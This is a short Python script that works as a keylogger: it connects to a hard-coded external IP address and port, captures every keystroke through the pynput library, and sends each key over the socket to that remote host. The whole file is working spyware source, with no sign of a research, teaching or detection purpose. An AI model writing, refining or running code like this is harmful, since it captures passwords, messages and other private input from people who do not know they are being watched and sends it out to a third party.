
import socket
from pynput import keyboard


HOST = '210.121.159.217'
PORT = 15432

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))


def on_press(key):
    request = str(key)
    print(key)
    client_socket.send(request.encode("utf-8"))


while True:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

client_socket.close()